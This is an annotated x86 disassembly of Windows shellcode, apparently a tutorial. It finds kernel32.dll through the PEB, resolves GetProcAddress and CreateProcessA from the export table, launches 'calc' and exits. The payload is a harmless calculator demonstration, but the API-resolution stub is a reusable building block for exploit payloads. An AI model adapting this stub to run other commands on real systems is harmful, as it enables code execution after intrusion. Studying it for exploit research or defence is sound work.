
Section 1: Find kernel32.dll base address

      0:  31 c9                   xor    ecx,ecx                        // ECX = 0
      2:  f7 e1                   mul    ecx                            // EAX = 0
      4:  64 8b 41 30             mov    eax,DWORD PTR fs:[ecx+0x30]    // PEB loaded in eax
      8:  8b 40 0c                mov    eax,DWORD PTR [eax+0xc]        // LDR loaded in eax
      b:  8b 70 14                mov    esi,DWORD PTR [eax+0x14]       // InMemoryOrderModuleList loaded in esi
      e:  ad                      lods   eax,DWORD PTR ds:[esi]         // program.exe address loaded in eax (1st module)
      f:  96                      xchg   esi,eax
      10: ad                      lods   eax,DWORD PTR ds:[esi]         // ntdll.dll address loaded (2nd module)
      11: 8b 58 10                mov    ebx,DWORD PTR [eax+0x10]       // kernel32.dll address loaded in ebx (3rd module)

Section 2: Get address of Name table

      14: 8b 53 3c                mov    edx,DWORD PTR [ebx+0x3c]       // load e_lfanew address in ebx
      17: 01 da                   add    edx,ebx
      19: 8b 52 78                mov    edx,DWORD PTR [edx+0x78]       // load data directory
      1c: 01 da                   add    edx,ebx
      1e: 8b 72 20                mov    esi,DWORD PTR [edx+0x20]       // load "address of name"
      21: 01 de                   add    esi,ebx
      23: 31 c9                   xor    ecx,ecx

Section 3: Get ProcAddress

  loop:
      25: 41                      inc    ecx                          // ordinals increment
      26: ad                      lods   eax,DWORD PTR ds:[esi]       // get "address of name" in eax
      27: 01 d8                   add    eax,ebx
      29: 81 38 47 65 74 50       cmp    DWORD PTR [eax],0x50746547   // GetP
      2f: 75 f4                   jne    0x25
      31: 81 78 0a 72 65 73 73    cmp    DWORD PTR [eax+0xa],0x73736572 //rocA
      38: 75 eb                   jne    0x25

  getProcAddressFunc:
      3a: 8b 72 24                mov    esi,DWORD PTR [edx+0x24]       // offset ordinals
      3d: 01 de                   add    esi,ebx                        // pointer to the name ordinals table
      3f: 66 8b 0c 4e             mov    cx,WORD PTR [esi+ecx*2]        // CX = Number of function
      43: 49                      dec    ecx
      44: 8b 72 1c                mov    esi,DWORD PTR [edx+0x1c]       // ESI = Offset address table
      47: 01 de                   add    esi,ebx                        // We placed at the begin of AddressOfFunctions array
      49: 8b 14 8e                mov    edx,DWORD PTR [esi+ecx*4]      // EDX = Pointer
      4c: 01 da                   add    edx,ebx                        // EDX = getProcAddressFunc
      4e: 89 d5                   mov    ebp,edx                        // Save getProcAddress in EBP for future purpose

   getCreateProcessA:
      50: 31 c9                   xor    ecx,ecx                        // ECX = 0
      52: 68 73 41 61 61          push   0x61614173                     // aaAs
      57: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161      // aaAs - aa
      5e: 68 6f 63 65 73          push   0x7365636f                     // ecor
      63: 68 74 65 50 72          push   0x72506574                     //
      68: 68 43 72 65 61          push   0x61657243                     //
      6d: 54                      push   esp                            //
      6e: 53                      push   ebx                            //
      6f: ff d2                   call   edx                            //

    zero_memory:
      71: 31 c9                   xor    ecx,ecx                        //
      73: b1 ff                   mov    cl,0xff                        //
      75: 31 ff                   xor    edi,edi                        //

    zero_loop:
      77: 57                      push   edi                            //
      78: e2 fd                   loop   0x77                           //

    getcalc:
      7a: 68 63 61 6c 63          push   0x636c6163                     //
      7f: 89 e1                   mov    ecx,esp                        //

      81: 51                      push   ecx
      82: 51                      push   ecx
      83: 31 d2                   xor    edx,edx
      85: 52                      push   edx
      86: 52                      push   edx
      87: 52                      push   edx
      88: 52                      push   edx
      89: 52                      push   edx
      8a: 52                      push   edx
      8b: 51                      push   ecx
      8c: 52                      push   edx
      8d: ff d0                   call   eax

    getExitProcess:
      8f: 83 c4 10                add    esp,0x10
      92: 68 65 73 73 61          push   0x61737365
      97: 66 83 6c 24 03 61       sub    WORD PTR [esp+0x3],0x61
      9d: 68 50 72 6f 63          push   0x636f7250
      a2: 68 45 78 69 74          push   0x74697845
      a7: 54                      push   esp
      a8: 53                      push   ebx
      a9: ff d5                   call   ebp

      ab: 31 c9                   xor    ecx,ecx
      ad: 51                      push   ecx
      ae: ff d0                   call   eax
